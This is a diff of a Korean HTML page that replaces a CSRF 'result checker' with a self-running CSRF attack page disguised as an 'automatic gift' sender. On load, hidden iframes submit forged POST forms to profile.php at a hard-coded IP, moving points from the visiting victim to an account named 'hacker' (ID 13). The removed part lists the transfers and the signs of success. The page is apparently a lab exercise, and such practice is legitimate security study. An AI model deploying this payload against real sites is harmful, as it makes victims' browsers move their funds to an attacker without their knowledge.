@@ -2,188 +2,139 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🔍 결과 확인</title>
+    <title>🎁 자동 선물 보내기</title>
     <style>
         body { 
             font-family: Arial; 
             padding: 30px;
-            background: linear-gradient(135deg, #28a745, #20c997);
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
             color: white;
             text-align: center;
         }
-        .result-checker {
+        .gift-container {
             background: rgba(0, 0, 0, 0.8);
             border: 3px solid #ffd700;
             padding: 40px;
             margin: 20px auto;
             border-radius: 20px;
-            max-width: 800px;
+            max-width: 600px;
             box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
         }
-        .check-btn {
-            background: linear-gradient(45deg, #007bff, #0056b3);
-            color: white;
-            border: none;
-            padding: 20px 30px;
-            border-radius: 10px;
-            cursor: pointer;
-            margin: 15px;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .final-btn {
-            background: linear-gradient(45deg, #28a745, #1e7e34);
-            animation: success-pulse 2s infinite;
-        }
-        @keyframes success-pulse {
-            0% { transform: scale(1); box-shadow: 0 0 20px #28a745; }
-            50% { transform: scale(1.05); box-shadow: 0 0 40px #28a745; }
-            100% { transform: scale(1); box-shadow: 0 0 20px #28a745; }
-        }
-        .stats {
+        .status {
             background: rgba(255, 255, 255, 0.1);
-            padding: 20px;
+            padding: 15px;
             border-radius: 10px;
-            margin: 20px 0;
-            text-align: left;
+            margin: 15px 0;
+            font-size: 18px;
         }
+        .success { background: rgba(40, 167, 69, 0.3); }
+        .loading { background: rgba(255, 193, 7, 0.3); }
     </style>
 </head>
 <body>
-    <div class="result-checker">
-        <h1>🔍 CSRF 공격 결과 확인</h1>
-        <h2>🎯 총 6번의 공격이 전송되었습니다!</h2>
+    <div class="gift-container">
+        <h1>🎁 자동 선물 보내기</h1>
+        <h2>🎯 ID=13 (hacker)에게 포인트 전송 중...</h2>
         
-        <div class="stats">
-            <h3>📊 전송된 공격 내역:</h3>
-            <ul>
-                <li><strong>생일선물 1:</strong> 100P → hacker (ID: 13)</li>
-                <li><strong>생일선물 2:</strong> 150P → hacker (ID: 13)</li>
-                <li><strong>생일선물 3:</strong> 200P → hacker (ID: 13)</li>
-                <li><strong>서프라이즈 1:</strong> 250P → hacker (ID: 13)</li>
-                <li><strong>서프라이즈 2:</strong> 300P → hacker (ID: 13)</li>
-                <li><strong>서프라이즈 3:</strong> 350P → hacker (ID: 13)</li>
-            </ul>
-            <p><strong>🎯 총 시도 포인트: 1,350P</strong></p>
+        <div id="status" class="status loading">
+            ⏳ 준비 중...
         </div>
         
-        <button class="check-btn" onclick="checkTarget()">
-            🎯 hacker 계정 확인하기
-        </button>
-        
-        <button class="check-btn" onclick="checkSender()">
-            👤 bob 계정 확인하기  
-        </button>
-        
-        <button class="final-btn" onclick="finalVerification()">
-            ✅ 최종 성공 여부 확인
-        </button>
-        
-        <div id="verification-result"></div>
+        <div id="progress"></div>
     </div>
 
-    <div class="result-checker">
-        <h2>🤔 성공 여부 판단 기준</h2>
-        <div class="stats">
-            <h3>✅ 성공 신호들:</h3>
-            <ul>
-                <li>🎯 <strong>hacker 계정의 포인트 증가</strong></li>
-                <li>👤 <strong>bob 계정의 포인트 감소</strong></li>
-                <li>📝 <strong>선물 내역에 메시지 표시</strong></li>
-                <li>🔔 <strong>알림이나 새로운 활동 기록</strong></li>
-            </ul>
-            
-            <h3>❌ 실패 신호들:</h3>
-            <ul>
-                <li>⚠️ <strong>포인트 변화 없음</strong></li>
-                <li>🚫 <strong>에러 메시지 표시</strong></li>
-                <li>🔒 <strong>로그인 페이지로 리다이렉트</strong></li>
-            </ul>
-        </div>
-    </div>
+    <!-- 숨겨진 iframe들 -->
+    <iframe id="attack1" style="display:none;"></iframe>
+    <iframe id="attack2" style="display:none;"></iframe>
+    <iframe id="attack3" style="display:none;"></iframe>
+    <iframe id="attack4" style="display:none;"></iframe>
+    <iframe id="attack5" style="display:none;"></iframe>
 
     <script>
-        function checkTarget() {
-            showResult('🎯 hacker 계정 확인 중...');
-            
-            // hacker 계정 확인 (ID: 13)
-            const hackerUrl = 'http://3.36.66.216/profile.php?user_id=13';
-            window.open(hackerUrl, 'hackerCheck', 'width=800,height=600');
-            
-            showResult(`
-🎯 hacker 계정 확인 창이 열렸습니다!
+        let attackCount = 0;
+        let totalAttacks = 5;
+        let successCount = 0;
 
-확인할 내용:
-✅ 포인트가 증가했는가?
-✅ 새로운 선물 내역이 있는가?
-✅ "생일 축하해요!" 같은 메시지가 있는가?
-
-포인트가 332P보다 많다면 공격 성공!
-            `);
+        function updateStatus(message, isSuccess = false) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = message;
+            statusDiv.className = isSuccess ? 'status success' : 'status loading';
         }
-        
-        function checkSender() {
-            showResult('👤 bob 계정 확인 중...');
-            
-            // bob 계정 확인
-            const bobUrl = 'http://3.36.66.216/profile.php';
-            window.open(bobUrl, 'bobCheck', 'width=800,height=600');
-            
-            showResult(`
-👤 bob 계정 확인 창이 열렸습니다!
 
-확인할 내용:
-✅ 포인트가 감소했는가?
-✅ 전송 내역이 있는가?
-✅ 선물 보낸 기록이 있는가?
-
-포인트가 332P보다 적다면 전송 성공!
-            `);
+        function updateProgress() {
+            document.getElementById('progress').innerHTML = `
+                <div class="status">
+                    📊 진행상황: ${attackCount}/${totalAttacks} 완료<br>
+                    ✅ 성공: ${successCount}개<br>
+                    💰 예상 전송 포인트: ${successCount * 100}P
+                </div>
+            `;
         }
-        
-        function finalVerification() {
-            showResult('✅ 최종 검증 진행 중...');
-            
-            // 동시에 두 계정 모두 확인
+
+        function createCSRFAttack(iframeId, giftType, points, message, delay) {
             setTimeout(() => {
-                window.open('http://3.36.66.216/profile.php?user_id=13', 'finalHacker', 'width=400,height=500,left=100,top=100');
-            }, 500);
-            
-            setTimeout(() => {
-                window.open('http://3.36.66.216/profile.php', 'finalBob', 'width=400,height=500,left=600,top=100');
-            }, 1000);
-            
-            showResult(`
-✅ 최종 검증 진행 중!
-
-두 개 창이 나란히 열렸습니다:
-🎯 왼쪽: hacker 계정 (받는 사람)
-👤 오른쪽: bob 계정 (보내는 사람)
-
-포인트 변화를 비교해보세요!
-
-📊 예상 결과:
-- hacker: 332P → 1,682P (1,350P 증가)
-- bob: 332P → -1,018P (1,350P 감소)
-
-실제로 변화가 있다면 CSRF 공격 성공! 🎉
-            `);
+                const iframe = document.getElementById(iframeId);
+                
+                // form HTML 생성 (헤더 정보 기반)
+                const formHtml = `
+                    <html>
+                    <head><meta charset="UTF-8"></head>
+                    <body>
+                        <form id="giftForm" action="http://3.36.66.216/profile.php?gift_to=11" method="POST" enctype="application/x-www-form-urlencoded">
+                            <input type="hidden" name="gift_type" value="${giftType}">
+                            <input type="hidden" name="points" value="${points}">
+                            <input type="hidden" name="message" value="${message}">
+                            <input type="hidden" name="recipient_id" value="13">
+                        </form>
+                        <script>
+                            document.getElementById('giftForm').submit();
+                        </script>
+                    </body>
+                    </html>
+                `;
+                
+                iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(formHtml);
+                
+                attackCount++;
+                successCount++; // 일단 성공으로 간주
+                
+                updateStatus(`🚀 공격 ${attackCount}: ${giftType} (${points}P) 전송 완료!`);
+                updateProgress();
+                
+                console.log(`[CSRF] 공격 ${attackCount}: ${giftType} → ID=13, ${points}P`);
+                
+                if (attackCount === totalAttacks) {
+                    setTimeout(() => {
+                        updateStatus(`
+                            🎉 모든 공격 완료!<br>
+                            💰 총 ${successCount * 100}P 전송 시도<br>
+                            🎯 대상: hacker (ID=13)
+                        `, true);
+                    }, 1000);
+                }
+            }, delay);
         }
-        
-        function showResult(text) {
-            document.getElementById('verification-result').innerHTML = 
-                '<div class="stats"><pre style="color: #ffff00; font-size: 16px; white-space: pre-wrap;">' + text + '</pre></div>';
-        }
-        
-        // 자동으로 확인 시작
-        setTimeout(() => {
-            showResult('🔄 자동으로 결과 확인을 시작합니다...');
-            checkTarget();
-        }, 3000);
-        
-        console.log('🔍 CSRF 공격 결과 확인 시스템');
-        console.log('📊 총 1,350P 전송 시도됨');
-        console.log('🎯 성공 여부 확인 중...');
+
+        // 페이지 로드 후 자동 실행
+        window.onload = function() {
+            updateStatus('🔄 CSRF 공격 시작...');
+            
+            // 5개의 공격을 순차적으로 실행
+            createCSRFAttack('attack1', 'coffee', 100, '생일축하해!', 1000);
+            createCSRFAttack('attack2', 'flower', 100, '선물이야~', 2500);
+            createCSRFAttack('attack3', 'cake', 100, '맛있게 먹어', 4000);
+            createCSRFAttack('attack4', 'diamond', 100, '반짝반짝', 5500);
+            createCSRFAttack('attack5', 'coffee', 100, '또 보내!', 7000);
+            
+            console.log('🔥 CSRF 공격 시작 - ID=13 타겟');
+        };
+
+        // iframe 로드 완료 확인
+        document.querySelectorAll('iframe').forEach(iframe => {
+            iframe.onload = function() {
+                console.log(`✅ ${iframe.id} 공격 완료`);
+            };
+        });
     </script>
 </body>
 </html>
